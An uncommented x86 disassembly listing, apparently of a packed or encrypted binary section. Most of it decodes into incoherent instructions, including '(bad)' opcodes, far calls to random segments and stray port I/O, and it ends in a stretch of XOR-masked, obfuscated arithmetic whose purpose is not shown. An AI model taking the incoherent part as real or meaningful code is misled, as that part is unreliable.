  417c7e:	fdivr  QWORD PTR [esi+0x10917d75]
  417c84:	dec    edi
  417c85:	mov    ch,0xf5
  417c87:	mov    bh,0x93
  417c89:	mov    edi,0xe7751d4b
  417c8e:	sub    al,0x3a
  417c90:	xchg   edx,eax
  417c91:	sub    eax,0xddea0cfc
  417c96:	icebp  
  417c97:	cmp    BYTE PTR [edx+0x1c],0xa6
  417c9b:	mov    dl,ch
  417c9d:	arpl   WORD PTR [ebp+0x4b],cx
  417ca0:	call   0x7f0393be
  417ca5:	mov    ah,0xb5
  417ca7:	pop    edi
  417ca8:	icebp  
  417ca9:	test   al,0x1e
  417cab:	sub    cl,BYTE PTR cs:[edi]
  417cae:	mov    eax,ds:0x1b60f356
  417cb3:	adc    esp,DWORD PTR [ebx-0x731bdf8e]
  417cb9:	add    BYTE PTR [eax-0x37],0x5e
  417cbd:	std    
  417cbe:	leave  
  417cbf:	cli    
  417cc0:	(bad)  
  417cc1:	int    0x4a
  417cc3:	jae    0x417d0b
  417cc5:	sub    ecx,DWORD PTR [ebp-0x3562a81a]
  417ccb:	sbb    DWORD PTR [esi+0x2f],esp
  417cce:	jns    0x417c69
  417cd0:	call   0x8bfc:0x45e94989
  417cd7:	jno    0x417c65
  417cd9:	outs   dx,BYTE PTR ds:[esi]
  417cda:	mov    gs,WORD PTR [edx-0x48]
  417cdd:	inc    ecx
  417cde:	sub    al,0x38
  417ce0:	sub    al,0x18
  417ce2:	aam    0x6a
  417ce4:	push   esp
  417ce5:	jo     0x417d1d
  417ce7:	dec    ebp
  417ce8:	or     bh,dh
  417cea:	cmp    eax,0xd4e18a21
  417cef:	sar    BYTE PTR [eax-0x24],1
  417cf2:	dec    esi
  417cf3:	fdiv   DWORD PTR [edx+eiz*1+0x53]
  417cf7:	call   0xc2a82238
  417cfc:	nop
  417cfd:	daa    
  417cfe:	push   esp
  417cff:	retf   0xbbe2
  417d02:	lods   eax,DWORD PTR ds:[esi]
  417d03:	lods   eax,DWORD PTR ds:[esi]
  417d04:	push   es
  417d05:	push   0xffffff87
  417d07:	inc    ebx
  417d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d09:	div    DWORD PTR [eax+0x5c77ccb7]
  417d0f:	sahf   
  417d10:	inc    eax
  417d11:	or     BYTE PTR [ebp+0x72],0x56
  417d15:	dec    esi
  417d16:	nop
  417d17:	inc    edi
  417d18:	or     al,bl
  417d1a:	xchg   ecx,eax
  417d1b:	cmp    BYTE PTR [eax+0x3e],dh
  417d1e:	js     0x417ce4
  417d20:	cli    
  417d21:	loop   0x417d5a
  417d23:	xor    DWORD PTR [ecx],ecx
  417d25:	imul   BYTE PTR [ebx-0x16294b3a]
  417d2b:	sub    esp,0xb6eaf2ec
  417d31:	inc    edi
  417d32:	aas    
  417d33:	xchg   edx,eax
  417d34:	mov    al,0xd7
  417d36:	mov    edx,0xcf2a8133
  417d3b:	cdq    
  417d3c:	pop    edi
  417d3d:	clc    
  417d3e:	add    DWORD PTR [edi-0x23],eax
  417d41:	xlat   BYTE PTR ds:[ebx]
  417d42:	dec    edi
  417d43:	mov    bl,0x50
  417d45:	fnstcw WORD PTR [edi]
  417d47:	sub    al,0x5e
  417d49:	jge    0x417d38
  417d4b:	push   edi
  417d4c:	loop   0x417d8c
  417d4e:	pop    eax
  417d4f:	sub    eax,0xdd39f037
  417d54:	xchg   ecx,eax
  417d55:	adc    BYTE PTR [ebp-0x37],dl
  417d58:	xor    DWORD PTR [ebx+ebx*1+0x54],ebp
  417d5c:	xchg   esi,eax
  417d5d:	xor    eax,0x8e49934
  417d62:	xor    esi,eax
  417d64:	lds    esi,FWORD PTR [ebp-0x2c]
  417d67:	mov    ?,WORD PTR [ecx]
  417d69:	cmp    ah,BYTE PTR cs:[eax-0x28e6f4]
  417d70:	inc    ebp
  417d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d72:	xchg   ebx,eax
  417d73:	mov    BYTE PTR [edi+0x37],dl
  417d76:	jecxz  0x417cf9
  417d78:	pop    edi
  417d79:	sbb    eax,0x47b50696
  417d7e:	sar    DWORD PTR [ebx-0x65cf20ce],1
  417d84:	cs jge 0x417d99
  417d87:	mov    ds:0x7937952d,eax
  417d8c:	mov    edx,0xd9261214
  417d91:	pop    esi
  417d92:	repz jge 0x417dc0
  417d95:	loopne 0x417d92
  417d97:	push   ebp
  417d98:	jno    0x417e14
  417d9a:	test   eax,edi
  417d9c:	cwde   
  417d9d:	push   0x3e
  417d9f:	sbb    al,0xcd
  417da1:	push   edi
  417da2:	in     al,0xe9
  417da4:	stos   DWORD PTR es:[edi],eax
  417da5:	add    ebp,ecx
  417da7:	ins    BYTE PTR es:[edi],dx
  417da8:	adc    ecx,DWORD PTR ds:0xa210dd8d
  417dae:	shr    BYTE PTR [edi],cl
  417db0:	or     al,0x3
  417db2:	div    dh
  417db4:	out    dx,eax
  417db5:	cdq    
  417db6:	loopne 0x417df1
  417db8:	sub    ebp,DWORD PTR [esi-0x4cbf88d9]
  417dbe:	iret   
  417dbf:	bound  edi,QWORD PTR [ebx-0x55dd3272]
  417dc5:	loop   0x417e21
  417dc7:	mov    ecx,0x5392cb97
  417dcc:	jne    0x417de0
  417dce:	es adc ebx,eax
  417dd1:	or     esi,DWORD PTR [esi-0x42]
  417dd4:	ins    BYTE PTR es:[edi],dx
  417dd5:	xor    BYTE PTR [edx],cl
  417dd7:	lods   eax,DWORD PTR ds:[esi]
  417dd8:	dec    eax
  417dd9:	fld    TBYTE PTR [ebx+eax*4]
  417ddc:	shl    BYTE PTR [esi-0x2a],0x15
  417de0:	or     BYTE PTR [ebx],bl
  417de2:	mov    al,ds:0xf04c4c4e
  417de7:	aaa    
  417de8:	push   cs
  417de9:	stos   BYTE PTR es:[edi],al
  417dea:	aam    0x63
  417dec:	call   0x73309663
  417df1:	adc    eax,edx
  417df3:	adc    DWORD PTR [ebp+0x578148f7],eax
  417df9:	popa   
  417dfa:	cmp    esp,DWORD PTR [ecx-0x16]
  417dfd:	or     ch,BYTE PTR [eax]
  417dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e00:	jo     0x417e79
  417e02:	xlat   BYTE PTR ds:[ebx]
  417e03:	mov    ds:0x915a34d7,eax
  417e08:	xchg   edx,eax
  417e09:	xor    eax,0x6d7a492b
  417e0e:	cmp    dl,ch
  417e10:	popa   
  417e11:	repz inc eax
  417e13:	xchg   esi,eax
  417e14:	or     al,0xc6
  417e16:	cli    
  417e17:	xchg   ecx,eax
  417e18:	in     eax,dx
  417e19:	into   
  417e1a:	mov    dl,0x1b
  417e1c:	dec    ecx
  417e1d:	jae    0x417e35
  417e1f:	push   0xffffffd3
  417e21:	imul   edi,DWORD PTR [edi+0x5e],0xffffffd1
  417e25:	push   ebx
  417e26:	pop    esp
  417e27:	add    DWORD PTR [esi],esp
  417e29:	mov    dl,0x99
  417e2b:	fisttp QWORD PTR [edi]
  417e2d:	jo     0x417e60
  417e2f:	push   ebp
  417e30:	cmp    ebp,DWORD PTR [ebp-0x1aeb2d83]
  417e36:	pop    edi
  417e37:	xor    edi,ebp
  417e39:	xchg   ecx,eax
  417e3a:	sar    DWORD PTR [ebx],cl
  417e3c:	sub    eax,0x17e63edc
  417e41:	fild   QWORD PTR [ebx-0x730346e1]
  417e47:	adc    DWORD PTR [ebx],0x25
  417e4a:	pop    edi
  417e4b:	test   DWORD PTR [ebx-0xecfd288],edx
  417e51:	fimul  WORD PTR [esi]
  417e53:	aad    0x74
  417e55:	jmp    0x417e97
  417e57:	mov    ebx,0xbefae425
  417e5c:	mov    dh,0xce
  417e5e:	cmp    BYTE PTR [ebp+0x2ac89111],al
  417e64:	add    DWORD PTR [esi-0x8],ebx
  417e67:	sub    ecx,edx
  417e69:	mov    ah,0xc
  417e6b:	ins    DWORD PTR es:[edi],dx
  417e6c:	adc    ebx,DWORD PTR [esi-0x6384f396]
  417e72:	xor    edi,0x1d800d1
  417e78:	stos   BYTE PTR es:[edi],al
  417e79:	jo     0x417ead
  417e7b:	gs push ds
  417e7d:	(bad)  
  417e7e:	lock push cs
  417e80:	sti    
  417e81:	das    
  417e82:	enter  0x50ab,0x29
  417e86:	cli    
  417e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e88:	iret   
  417e89:	and    BYTE PTR [edi+0x179465f1],dh
  417e8f:	push   esp
  417e90:	cli    
  417e91:	(bad)  
  417e92:	inc    esp
  417e93:	pop    ebp
  417e94:	add    al,0xca
  417e96:	cdq    
  417e97:	ss inc ebp
  417e99:	and    BYTE PTR [eax-0x2d],bh
  417e9c:	sar    BYTE PTR [eax+0x292bfaf6],1
  417ea2:	push   edi
  417ea3:	and    ebp,ebp
  417ea5:	(bad)  
  417ea6:	push   ecx
  417ea7:	add    eax,0x663d3ee5
  417eac:	shl    DWORD PTR [di+0x3ac9],0xe4
  417eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb3:	push   ss
  417eb4:	out    0x35,eax
  417eb6:	jmp    0x371dbf16
  417ebb:	int3   
  417ebc:	pop    es
  417ebd:	pop    ecx
  417ebe:	push   edi
  417ebf:	fcmovbe st,st(0)
  417ec1:	js     0x417f02
  417ec3:	test   DWORD PTR [edi+edi*8],edi
  417ec6:	sub    ebp,DWORD PTR [edx+edx*8-0x23]
  417eca:	call   0xf5b9:0x1546d267
  417ed1:	pop    ecx
  417ed2:	and    BYTE PTR ds:0x5689f1fb,al
  417ed8:	enter  0x71eb,0xd4
  417edc:	adc    al,0x4a
  417ede:	in     al,dx
  417edf:	and    eax,0x74211ba6
  417ee4:	stos   BYTE PTR es:[edi],al
  417ee5:	sbb    bl,BYTE PTR [edx-0x824b355]
  417eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eec:	popa   
  417eed:	das    
  417eee:	imul   edi,DWORD PTR [edx],0x21
  417ef1:	pop    es
  417ef2:	rol    ch,cl
  417ef4:	stos   DWORD PTR es:[edi],eax
  417ef5:	pop    eax
  417ef6:	aaa    
  417ef7:	or     dl,al
  417ef9:	shr    edx,1
  417efb:	fcmovnb st,st(7)
  417efd:	pop    edi
  417efe:	mov    DWORD PTR [edx+0x6d],ebp
  417f01:	add    al,0x3b
  417f03:	fmul   DWORD PTR [edi]
  417f05:	loop   0x417f80
  417f07:	aas    
  417f08:	mov    bl,0x46
  417f0a:	lock sbb bl,BYTE PTR [eax-0x48df0928]
  417f11:	leave  
  417f12:	mov    bl,0xd7
  417f14:	inc    edi
  417f15:	jp     0x417f10
  417f17:	mov    eax,0x244d398c
  417f1c:	fild   QWORD PTR [eax-0x1c]
  417f1f:	je     0x417f08
  417f21:	jb     0x417f90
  417f23:	int    0x88
  417f25:	ds adc dh,bl
  417f28:	(bad)  
  417f29:	adc    al,BYTE PTR [ecx-0x30]
  417f2c:	icebp  
  417f2d:	mov    ?,eax
  417f2f:	rol    DWORD PTR [esi+0x1c040c28],cl
  417f35:	add    DWORD PTR [edx*8-0x7b234a6],ecx
  417f3c:	ret    0x4870
  417f3f:	aad    0xb
  417f41:	imul   eax,ecx,0x48
  417f44:	sub    dh,BYTE PTR [esi-0x383454dd]
  417f4a:	out    0x34,eax
  417f4c:	pop    esp
  417f4d:	mov    es,WORD PTR [esp+ebp*8-0x24]
  417f51:	pop    esp
  417f52:	push   edi
  417f53:	mul    BYTE PTR [esi-0x1f]
  417f56:	xchg   ebx,eax
  417f57:	xor    eax,0xda0aba57
  417f5c:	adc    ecx,DWORD PTR [edx-0x1]
  417f5f:	add    bl,0xc6
  417f62:	enter  0x8b48,0xea
  417f66:	pop    esi
  417f67:	pop    ebx
  417f68:	jmp    0x417fb4
  417f6a:	loope  0x417fc0
  417f6c:	arpl   bx,si
  417f6e:	es push edi
  417f70:	(bad)  
  417f71:	mul    BYTE PTR [ecx]
  417f73:	cmp    DWORD PTR [ecx+0x14e8a9d8],esi
  417f79:	jp     0x417f79
  417f7b:	imul   ebx,DWORD PTR [ecx],0xffffffe0
  417f7e:	sub    DWORD PTR [ebx+0x5a],ecx
  417f81:	xlat   BYTE PTR ds:[bx]
  417f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f84:	push   edi
  417f85:	out    dx,eax
  417f86:	test   al,0xff
  417f88:	hlt    
  417f89:	in     eax,dx
  417f8a:	or     eax,DWORD PTR [ecx+edi*2]
  417f8d:	sub    dl,BYTE PTR ds:0x52a09dc4
  417f93:	mov    eax,ds:0xddc0f4be
  417f98:	push   ss
  417f99:	test   eax,0x7cc10a7b
  417f9e:	leave  
  417f9f:	enter  0xd1ac,0xd7
  417fa3:	inc    esp
  417fa4:	and    DWORD PTR [ecx+0x232d1221],0xfd74c5be
  417fae:	sti    
  417faf:	lahf   
  417fb0:	xchg   ecx,eax
  417fb1:	push   edx
  417fb2:	ficom  WORD PTR [edi-0x1b]
  417fb5:	or     eax,0xc23b0745
  417fba:	in     eax,dx
  417fbb:	sbb    eax,0x7d14a0f7
  417fc0:	mov    ecx,0x608a0b7e
  417fc5:	les    esp,FWORD PTR [eax-0x2479a75f]
  417fcb:	pop    ebx
  417fcc:	dec    ebx
  417fcd:	mov    al,0xf
  417fcf:	jmp    0x749e:0xd32e1ae6
  417fd6:	mov    eax,0xad7350cb
  417fdb:	loope  0x417fa4
  417fdd:	es in  eax,dx
  417fdf:	add    al,0xb3
  417fe1:	imul   ebx,DWORD PTR [esi],0xceee15a3
  417fe7:	inc    esp
  417fe8:	dec    esi
  417fe9:	sub    BYTE PTR [ebx],0x76
  417fec:	loop   0x418021
  417fee:	fidivr WORD PTR [edx+edi*4+0x353a7c32]
  417ff5:	neg    DWORD PTR [edi-0x73a3924f]
  417ffb:	pop    ebp
  417ffc:	ret    0xcb42
  417fff:	cwde   
  418000:	popa   
  418001:	rcr    DWORD PTR [ebp-0x39],0x69
  418005:	inc    edx
  418006:	fadd   QWORD PTR [edi-0x56]
  418009:	push   es
  41800a:	dec    esi
  41800b:	leave  
  41800c:	fsubr  DWORD PTR [edx]
  41800e:	xlat   BYTE PTR ds:[ebx]
  41800f:	sub    DWORD PTR [ecx+0x3a1e8e35],edx
  418015:	loope  0x417fef
  418017:	scas   al,BYTE PTR es:[edi]
  418018:	inc    ecx
  418019:	mov    bl,BYTE PTR [edx-0xa]
  41801c:	xchg   ebx,eax
  41801d:	adc    al,0xb3
  41801f:	xchg   esp,eax
  418020:	adc    BYTE PTR [eax-0x7a],cl
  418023:	inc    ebp
  418024:	loope  0x417fc7
  418026:	pop    ecx
  418027:	adc    al,0xc7
  418029:	lahf   
  41802a:	sbb    edx,DWORD PTR [ecx]
  41802c:	mov    ah,0xba
  41802e:	ins    BYTE PTR es:[edi],dx
  41802f:	pop    edx
  418030:	jnp    0x418048
  418032:	pop    edx
  418033:	not    BYTE PTR [ebx-0xa044fd3]
  418039:	idiv   ebx
  41803b:	out    0xb8,eax
  41803d:	mul    BYTE PTR [edi-0x98b3f38]
  418043:	sbb    eax,0xbf61abe8
  418048:	jae    0x418007
  41804a:	xor    bh,BYTE PTR [edi-0x49]
  41804d:	adc    al,0x6c
  41804f:	data16 addr16 jge 0x4180cd
  418053:	in     eax,dx
  418054:	jne    0x418080
  418056:	in     al,dx
  418057:	push   ebx
  418058:	or     DWORD PTR [edi+0x38],eax
  41805b:	lock mov esi,0x3cc45875
  418061:	xor    edi,DWORD PTR [esi-0x5d]
  418064:	and    ch,BYTE PTR [ecx+0x1c475300]
  41806a:	sbb    ah,BYTE PTR [edx]
  41806c:	je     0x4180bb
  41806e:	in     al,dx
  41806f:	mov    ebp,0xf4d1a53a
  418074:	gs daa 
  418076:	fwait
  418077:	push   ebp
  418078:	mov    eax,eax
  41807a:	mov    BYTE PTR [ecx-0x6b472cda],ch
  418080:	sub    DWORD PTR [ebx-0x32a49aac],0x1b9a39a8
  41808a:	xchg   ebp,eax
  41808b:	or     dl,bh
  41808d:	outs   dx,DWORD PTR ds:[esi]
  41808e:	add    DWORD PTR [esi-0x40],0x7f
  418092:	inc    edi
  418093:	cwde   
  418094:	dec    esi
  418095:	out    dx,eax
  418096:	add    BYTE PTR [edi+0x41],dl
  418099:	shl    DWORD PTR [ebx+eax*4],0xc6
  41809d:	(bad)  
  41809e:	ret    0xe266
  4180a1:	call   0x1976:0x2c4bf128
  4180a8:	push   0x101b1d30
  4180ad:	out    0xf6,eax
  4180af:	retf   0x50af
  4180b2:	pop    esi
  4180b3:	lea    edx,[ebx+eiz*8-0x3]
  4180b7:	imul   edi,DWORD PTR [ebp+0x51],0x3396b494
  4180be:	adc    al,0x63
  4180c0:	aas    
  4180c1:	jo     0x418044
  4180c3:	(bad)  
  4180c4:	mov    ch,0x67
  4180c6:	call   0xe0c7:0xd28c2e1a
  4180cd:	aaa    
  4180ce:	mov    bh,0x33
  4180d0:	jle    0x41814f
  4180d2:	jnp    0x418059
  4180d4:	pop    es
  4180d5:	cld    
  4180d6:	sub    dh,BYTE PTR [ebp+ebx*8-0x66103206]
  4180dd:	leave  
  4180de:	stc    
  4180df:	(bad)  
  4180e0:	bound  esi,QWORD PTR [eax+0x6db2fc6e]
  4180e6:	pop    ss
  4180e7:	xchg   ebx,eax
  4180e8:	inc    ecx
  4180e9:	in     al,0x35
  4180eb:	add    al,0x6c
  4180ed:	sbb    ah,BYTE PTR [edx]
  4180ef:	push   edi
  4180f0:	in     al,dx
  4180f1:	sub    edx,esp
  4180f3:	pop    ecx
  4180f4:	pop    ds
  4180f5:	xchg   ebp,eax
  4180f6:	pop    ss
  4180f7:	mov    ecx,0x1a1c5b09
  4180fc:	leave  
  4180fd:	fdivr  DWORD PTR [eax-0x2d30b7f1]
  418103:	arpl   WORD PTR [ecx],sp
  418105:	das    
  418106:	rcl    DWORD PTR [ebx+0x3],1
  418109:	les    ecx,FWORD PTR [esi+0x22d07151]
  41810f:	adc    eax,0x6ee253c7
  418114:	ins    DWORD PTR es:[edi],dx
  418115:	out    0x9d,eax
  418117:	out    0x53,eax
  418119:	in     al,dx
  41811a:	jnp    0x4180b6
  41811c:	fdivr  DWORD PTR [edi*1-0x7c04755f]
  418123:	xchg   esp,eax
  418124:	pop    esi
  418125:	cli    
  418126:	xor    DWORD PTR [edx+0x45],esi
  418129:	push   ecx
  41812a:	sub    al,bh
  41812c:	call   FWORD PTR [edi-0x1f45f219]
  418132:	mov    eax,ebx
  418134:	mov    ds:0xcb075fb5,eax
  418139:	scas   ax,WORD PTR es:[edi]
  41813b:	mov    cl,0xf3
  41813d:	jne    0x4181bd
  41813f:	stos   DWORD PTR es:[edi],eax
  418140:	pop    ebp
  418141:	hlt    
  418142:	mov    edx,0x8ca087e
  418147:	aad    0x89
  418149:	cmp    al,0x61
  41814b:	imul   edx,esi,0xee4f8a61
  418151:	and    eax,0x61d94c6e
  418156:	cmp    DWORD PTR [ecx-0x7435f0f4],ecx
  41815c:	int    0x0
  41815e:	xchg   cl,al
  418160:	mov    al,ds:0xa0535e74
  418165:	lods   eax,DWORD PTR ds:[esi]
  418166:	adc    al,0xaf
  418168:	test   al,0xda
  41816a:	das    
  41816b:	enter  0xe21e,0x9e
  41816f:	add    eax,0x789f81c
  418174:	push   ecx
  418175:	dec    esp
  418176:	int    0x37
  418178:	sbb    ebp,DWORD PTR [edi]
  41817a:	adc    edx,eax
  41817c:	push   es
  41817d:	(bad)  
  41817e:	js     0x41810c
  418180:	mov    DWORD PTR [esi+0x3f],eax
  418183:	mov    al,ds:0xa459a5d2
  418188:	jmp    esi
  41818a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41818b:	xor    BYTE PTR [edi-0x52],ch
  41818e:	and    eax,ebp
  418190:	mov    ecx,0x4591ecaa
  418195:	int    0xcd
  418197:	sub    DWORD PTR [ebx+0x71c2aae0],0x5c5a13e5
  4181a1:	inc    edx
  4181a2:	loopne 0x4181ea
  4181a4:	cli    
  4181a5:	mov    BYTE PTR [ecx],ah
  4181a7:	xchg   ebp,eax
  4181a8:	jle    0x418166
  4181aa:	retf   0x9ad7
  4181ad:	xchg   esi,eax
  4181ae:	sub    eax,0xdf848746
  4181b3:	jle    0x418190
  4181b5:	dec    esp
  4181b6:	fwait
  4181b7:	sbb    eax,0x316061e6
  4181bc:	xchg   ebp,eax
  4181bd:	cmp    DWORD PTR ds:0x18a190f0,ebp
  4181c3:	(bad)  
  4181c4:	or     eax,0x2edc88b5
  4181c9:	cmp    ah,bh
  4181cb:	(bad)
  4181ce:	jecxz  0x41820b
  4181d0:	xor    eax,0xd21b490f
  4181d5:	(bad)  
  4181d6:	int    0x49
  4181d8:	xor    cl,bh
  4181da:	fstp   st(6)
  4181dc:	add    dh,BYTE PTR [esi]
  4181de:	pushf  
  4181df:	jo     0x4181b2
  4181e1:	and    dl,BYTE PTR [esi-0x6db5bc04]
  4181e7:	jmp    0x4181c6
  4181e9:	jnp    0x4181ec
  4181eb:	(bad)  
  4181ec:	cld    
  4181ed:	cmc    
  4181ee:	ret    0x3975
  4181f1:	add    eax,0x6a438305
  4181f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f7:	cmp    eax,0xe432b47f
  4181fc:	fist   WORD PTR [ebx+0x60b0ddc4]
  418202:	stc    
  418203:	pop    ds
  418204:	mov    dl,0x9c
  418206:	(bad)  
  418207:	sub    eax,0xed1cc33f
  41820c:	mov    edi,0xc433d4b3
  418211:	push   eax
  418212:	pop    edx
  418213:	add    ebp,DWORD PTR [ecx+ebx*8+0x72]
  418217:	cmp    bl,dh
  418219:	fsub   QWORD PTR [edi+0x18c2dea5]
  41821f:	push   esp
  418220:	clc    
  418221:	and    esp,DWORD PTR fs:[eax-0x6a]
  418225:	mov    ch,0xb6
  418227:	cs int3 
  418229:	mov    edi,0xf912cdeb
  41822e:	cld    
  41822f:	xor    cl,BYTE PTR [ebx-0x3e17336b]
  418235:	daa    
  418236:	sub    al,0xfc
  418238:	std    
  418239:	mov    cl,0xce
  41823b:	push   eax
  41823c:	add    BYTE PTR [ebp+0x2d9cc19a],0x80
  418243:	out    dx,al
  418244:	gs push ss
  418246:	scas   al,BYTE PTR es:[edi]
  418247:	outs   dx,DWORD PTR ds:[esi]
  418248:	sbb    eax,0x89937ca4
  41824d:	sub    BYTE PTR [ebx],0x6f
  418250:	add    edx,edx
  418252:	mov    ecx,DWORD PTR [edi+edx*4-0x45b5a2e4]
  418259:	fisub  WORD PTR ds:0x568df2d
  41825f:	mov    ?,WORD PTR [ecx+0x6225c44e]
  418265:	not    DWORD PTR [ecx+0x50]
  418268:	sub    eax,0xf3a73781
  41826d:	mov    ah,0x9f
  41826f:	push   es
  418270:	or     al,0x93
  418272:	add    bh,BYTE PTR [ecx]
  418274:	adc    dl,BYTE PTR [esi+0x6a]
  418277:	psubq  mm4,QWORD PTR [ebx+0x1a0f15ac]
  41827e:	pop    esp
  41827f:	(bad)  [edi+0x62943fab]
  418285:	xor    bl,ch
  418287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418288:	inc    ecx
  418289:	dec    ecx
  41828a:	in     al,dx
  41828b:	ret    0x70ba
  41828e:	loope  0x4182b0
  418290:	and    al,cl
  418292:	adc    eax,0xcb12b50
  418297:	xor    DWORD PTR [ebx],esp
  418299:	add    DWORD PTR [eax+0xb17d2d9],ebp
  41829f:	pop    ss
  4182a0:	mov    ebp,0xd5a93638
  4182a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a6:	sbb    esp,edi
  4182a8:	fmul   DWORD PTR [ecx]
  4182aa:	enter  0x426d,0x76
  4182ae:	std    
  4182af:	and    al,BYTE PTR [ebp+0xa493340]
  4182b5:	push   0x24aee62c
  4182ba:	scas   eax,DWORD PTR es:[edi]
  4182bb:	or     DWORD PTR [edi+0x7c],0xffffffae
  4182bf:	jle    0x41829f
  4182c1:	loop   0x418323
  4182c3:	mov    bl,0xe
  4182c5:	xor    BYTE PTR [edx],ah
  4182c7:	mov    al,ds:0x78c40c54
  4182cc:	(bad)  
  4182cd:	sti    
  4182ce:	gs sbb DWORD PTR fs:[eax-0x58a954f1],ecx
  4182d6:	push   0x69
  4182d8:	push   ss
  4182d9:	push   esp
  4182da:	(bad)  
  4182db:	scas   al,BYTE PTR es:[edi]
  4182dc:	(bad)  
  4182dd:	je     0x418301
  4182df:	sar    DWORD PTR [ecx+eax*4+0x25],1
  4182e3:	wrmsr  
  4182e5:	pop    ecx
  4182e6:	adc    al,0x52
  4182e8:	mov    bl,0x98
  4182ea:	lahf   
  4182eb:	and    ecx,DWORD PTR [esi-0x6b]
  4182ee:	or     eax,0xb3860ef1
  4182f3:	dec    ebp
  4182f4:	nop
  4182f5:	test   DWORD PTR [eax],ebx
  4182f7:	pop    edi
  4182f8:	xor    BYTE PTR [ebx],0x80
  4182fb:	sbb    dl,BYTE PTR [eax]
  4182fd:	dec    ebx
  4182fe:	test   al,0x88
  418300:	daa    
  418301:	gs inc eax
  418303:	mov    al,0x8f
  418305:	push   ebx
  418306:	es pop es
  418308:	xor    al,0x93
  41830a:	push   0xb0531b1c
  41830f:	sar    BYTE PTR [edx+0x78],0xfd
  418313:	shr    DWORD PTR [eax-0x676dfc71],0xa2
  41831a:	shl    ebp,0xad
  41831d:	xchg   ecx,eax
  41831e:	(bad)  
  418320:	push   ebx
  418321:	aam    0xdc
  418323:	loopne 0x41831d
  418325:	push   0x7106127
  41832a:	iret   
  41832b:	xor    bl,BYTE PTR [ebp-0x5942b55d]
  418331:	in     eax,0x6f
  418333:	shr    BYTE PTR [eax],0x4b
  418336:	mov    al,ds:0xcabb8aba
  41833b:	mov    esi,0x73265ede
  418340:	jmp    0xdaab:0x32d484e2
  418347:	mov    al,0x40
  418349:	inc    edi
  41834a:	jmp    0xfba4c6f7
  41834f:	hlt    
  418350:	aam    0xb1
  418352:	out    dx,al
  418353:	push   0x9d02212c
  418358:	xchg   ebx,eax
  418359:	sbb    al,0x39
  41835b:	pop    edi
  41835c:	aam    0xe6
  41835e:	retf   
  41835f:	mov    edi,0x4a03c0e7
  418364:	or     al,0x81
  418366:	sub    DWORD PTR [esi+0x4e],ebx
  418369:	mov    ch,0x85
  41836b:	pop    esp
  41836c:	call   0xb2df:0xac0f38d7
  418373:	lahf   
  418374:	int    0x60
  418376:	(bad)  ds:0xebb8b35c
  41837c:	and    al,0x59
  41837e:	pop    edx
  41837f:	cli    
  418380:	pop    ss
  418381:	ja     0x41835b
  418383:	xchg   ebp,eax
  418384:	and    bl,bh
  418386:	xchg   edi,eax
  418387:	jne    0x413c7e
  41838d:	mov    edx,DWORD PTR [ebp-0xc]
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
